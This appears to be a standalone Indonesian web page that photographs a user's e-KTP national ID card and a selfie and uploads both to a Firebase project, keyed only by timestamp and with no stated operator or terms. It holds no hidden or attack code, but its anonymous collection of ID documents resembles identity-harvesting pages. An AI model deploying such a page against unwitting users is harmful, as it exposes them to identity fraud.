<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verifikasi Foto - BGT</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-storage-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
</head>
<body class="bg-gray-50 min-h-screen flex flex-col">

  <!-- Header -->
  <div class="flex items-center p-4 border-b bg-white">
    <button onclick="history.back()" class="text-xl mr-3">‚Üê</button>
    <h1 class="text-lg font-semibold">Verifikasi Foto</h1>
  </div>

  <div class="p-4 text-gray-700 bg-blue-50">
    Pastikan foto e-KTP dan selfie kamu jelas agar proses verifikasi cepat.
  </div>

  <div class="p-4 space-y-6 flex-1 overflow-y-auto">

    <!-- Foto KTP -->
    <div class="bg-white p-4 rounded-xl shadow-sm border">
      <h2 class="font-semibold text-lg mb-2">Foto e-KTP</h2>
      <div id="previewKTP" onclick="openCamera('previewKTP','environment')" class="w-24 h-24 bg-gray-100 flex items-center justify-center rounded-lg text-gray-400 text-3xl cursor-pointer hover:bg-gray-200 transition">üì∑</div>
    </div>

    <!-- Selfie -->
    <div class="bg-white p-4 rounded-xl shadow-sm border">
      <h2 class="font-semibold text-lg mb-2">Selfie</h2>
      <div id="previewSelfie" onclick="openCamera('previewSelfie','user')" class="w-24 h-24 bg-gray-100 flex items-center justify-center rounded-lg text-gray-400 text-3xl cursor-pointer hover:bg-gray-200 transition">üì∑</div>
    </div>

  </div>

  <!-- Tombol Kirim -->
  <div class="p-4 bg-white border-t">
    <button id="btnKirim" onclick="uploadData()" class="w-full bg-gray-300 text-white py-3 rounded-full font-semibold" disabled>Kirim</button>
  </div>

<script>
  // --- Firebase Config ---
  const firebaseConfig = {
    apiKey: "AIzaSyD3FQbFF5a91MlASpqImTMmGkYvaTcdxm0",
    authDomain: "kadek-ed34e.firebaseapp.com",
    databaseURL: "https://kadek-ed34e-default-rtdb.firebaseio.com",
    projectId: "kadek-ed34e",
    storageBucket: "kadek-ed34e.firebasestorage.app",
    messagingSenderId: "65756136303",
    appId: "1:65756136303:web:6dbe5bc658fadb05ca1e9a"
  };
  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();
  const storage = firebase.storage();

  let ktpFile = null;
  let selfieFile = null;

  // --- Fungsi Buka Kamera ---
  function openCamera(previewId, facingMode) {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } })
      .then(stream => {
        const video = document.createElement('video');
        video.autoplay = true;
        video.srcObject = stream;
        video.classList.add('fixed', 'inset-0', 'z-50', 'object-cover', 'w-full', 'h-full');

        // Tombol Ambil Foto
        const captureBtn = document.createElement('button');
        captureBtn.innerText = 'üì∏ Ambil Foto';
        captureBtn.classList.add('fixed', 'bottom-10', 'left-1/2', '-translate-x-1/2', 'bg-green-600', 'text-white', 'px-6', 'py-3', 'rounded-full', 'z-50', 'shadow-lg');

        // Tombol Tutup
        const closeBtn = document.createElement('button');
        closeBtn.innerText = '‚úñ';
        closeBtn.classList.add('fixed', 'top-5', 'right-5', 'bg-gray-800', 'text-white', 'rounded-full', 'w-10', 'h-10', 'flex', 'items-center', 'justify-center', 'z-50');

        // Overlay Bingkai
        const overlay = document.createElement('div');
        overlay.classList.add('fixed', 'inset-0', 'z-40', 'pointer-events-none', 'flex', 'items-center', 'justify-center');
        
        // --- Bentuk Bingkai ---
        if (previewId === 'previewKTP') {
          // Bingkai persegi panjang KTP
          overlay.innerHTML = `
            <div class="border-4 border-green-400 rounded-md w-3/4 max-w-md h-40 bg-transparent"></div>
          `;
        } else {
          // Bingkai oval wajah
          overlay.innerHTML = `
            <div class="border-4 border-blue-400 rounded-full w-48 h-60 bg-transparent"></div>
          `;
        }

        document.body.append(video, overlay, captureBtn, closeBtn);

        // Fungsi Ambil Foto
        captureBtn.onclick = () => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const dataUrl = canvas.toDataURL('image/jpeg');

          document.getElementById(previewId).innerHTML = `<img src="${dataUrl}" class="w-24 h-24 object-cover rounded-lg"/>`;

          if (previewId === 'previewKTP') ktpFile = dataUrl;
          if (previewId === 'previewSelfie') selfieFile = dataUrl;

          // Matikan kamera & hapus elemen
          stream.getTracks().forEach(t => t.stop());
          video.remove();
          overlay.remove();
          captureBtn.remove();
          closeBtn.remove();

          checkReady();
        };

        // Tutup Kamera
        closeBtn.onclick = () => {
          stream.getTracks().forEach(t => t.stop());
          video.remove();
          overlay.remove();
          captureBtn.remove();
          closeBtn.remove();
        };
      })
      .catch(err => {
        alert("Kamera gagal dibuka: " + err.message);
      });
  }

  // Aktifkan tombol kirim kalau dua foto sudah ada
  function checkReady() {
    if (ktpFile && selfieFile) {
      const btn = document.getElementById("btnKirim");
      btn.disabled = false;
      btn.classList.replace("bg-gray-300", "bg-green-600");
    }
  }

  // Upload ke Firebase
  async function uploadData() {
    if (!ktpFile || !selfieFile) return alert("Silakan ambil semua foto dulu.");

    const btn = document.getElementById("btnKirim");
    btn.innerText = "Mengirim...";
    btn.disabled = true;

    const timestamp = Date.now();
    const ktpRef = storage.ref('verifikasi/' + timestamp + '_ktp.jpg');
    const selfieRef = storage.ref('verifikasi/' + timestamp + '_selfie.jpg');

    try {
      const ktpSnap = await ktpRef.putString(ktpFile, 'data_url');
      const selfieSnap = await selfieRef.putString(selfieFile, 'data_url');
      const ktpURL = await ktpSnap.ref.getDownloadURL();
      const selfieURL = await selfieSnap.ref.getDownloadURL();

      await db.ref('verifikasi/' + timestamp).set({
        fotoKTP: ktpURL,
        fotoSelfie: selfieURL,
        status: 'menunggu',
        waktuUpload: new Date().toLocaleString()
      });

      btn.innerText = "Terkirim ‚úÖ";
      alert("Foto berhasil dikirim!");
    } catch (err) {
      console.error(err);
      alert("Gagal mengirim foto.");
      btn.innerText = "Kirim";
      btn.disabled = false;
    }
  }
</script>
</body>
</html>
